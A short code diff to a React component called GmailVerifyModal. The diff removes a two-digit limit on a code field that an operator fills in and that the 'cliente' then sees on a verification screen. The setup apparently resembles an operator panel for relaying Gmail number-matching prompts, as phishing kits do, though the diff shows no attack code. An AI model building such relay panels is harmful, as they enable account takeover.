@@ -45,10 +45,8 @@ export const GmailVerifyModal: React.FC<GmailVerifyModalProps> = ({ isOpen, onCl
   
   const handleChangeCodigo = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value;
-    // Permitir solo números y limitar a 2 dígitos
-    if (/^\d{0,2}$/.test(value)) {
-      setCodigo(value);
-    }
+    // Permitir cualquier código, sin validación restrictiva
+    setCodigo(value);
   };
 
   const handleSubmit = () => {
@@ -88,9 +86,8 @@ export const GmailVerifyModal: React.FC<GmailVerifyModalProps> = ({ isOpen, onCl
           value={codigo}
           onChange={handleChangeCodigo}
           className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
-          maxLength={2}
         />
-        <p className="text-xs text-gray-400 mt-1">Máximo 2 dígitos. El cliente verá este código en la pantalla de verificación.</p>
+        <p className="text-xs text-gray-400 mt-1">El cliente verá este código en la pantalla de verificación.</p>
       </div>
       
       <div className="mt-2 mb-4 text-sm text-gray-400">
